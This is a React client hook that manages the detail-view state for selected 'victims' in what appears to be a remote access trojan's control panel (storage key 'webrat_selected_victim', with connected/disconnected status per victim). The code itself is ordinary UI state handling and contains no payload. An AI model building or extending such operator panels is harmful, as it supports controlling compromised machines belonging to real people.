"use client";

import { useCallback, useEffect, useMemo, useState } from "react";

import type { Victim } from "../../api/victims";
import type { DetailSectionKey } from "../state/detail-section";
import type { DetailStatusState } from "../state/detail-status";

const STORAGE_KEY = "webrat_selected_victim";

export function usePanelDetailView(victims: Victim[]) {
   const [selectedVictimId, setSelectedVictimId] = useState<string | null>(() => {
      try {
         const fromStorage = sessionStorage.getItem(STORAGE_KEY);
         return fromStorage ? String(fromStorage) : null;
      } catch {
         return null;
      }
   });
   const [isOpen, setIsOpen] = useState(false);
   const [section, setSection] = useState<DetailSectionKey>("information");

   const selectedVictim = useMemo(() => {
      if (!selectedVictimId) return null;
      return victims.find((v) => String(v.id ?? "") === String(selectedVictimId)) ?? null;
   }, [selectedVictimId, victims]);

   const status: DetailStatusState = useMemo(() => {
      if (!selectedVictim) return "waiting";
      if (typeof selectedVictim.online === "boolean") return selectedVictim.online ? "connected" : "disconnected";
      const s = typeof selectedVictim.status === "string" ? selectedVictim.status.toLowerCase() : "";
      if (s === "online") return "connected";
      if (s === "offline") return "disconnected";
      return "waiting";
   }, [selectedVictim]);

   useEffect(() => {
      try {
         document.body.classList.toggle("isDetailView", isOpen);
      } catch {
      }

      return () => {
         try {
            document.body.classList.remove("isDetailView");
         } catch {
         }
      };
   }, [isOpen]);

   const selectVictim = useCallback((victimId: string) => {
      setSelectedVictimId(victimId);
      try {
         sessionStorage.setItem(STORAGE_KEY, victimId);
      } catch {
      }
   }, []);

   const openDetailForVictim = useCallback(
      (victimId: string) => {
         if (!victimId) return;
         selectVictim(victimId);
         setSection("information");
         setIsOpen(true);
      },
      [selectVictim],
   );

   const closeDetailView = useCallback(() => {
      setIsOpen(false);
      setSection("information");
      try {
         sessionStorage.removeItem(STORAGE_KEY);
      } catch {
      }
   }, []);

   return {
      isOpen,
      section,
      setSection,
      status,
      selectedVictimId,
      selectedVictim,
      selectVictim,
      openDetailForVictim,
      closeDetailView,
   };
}
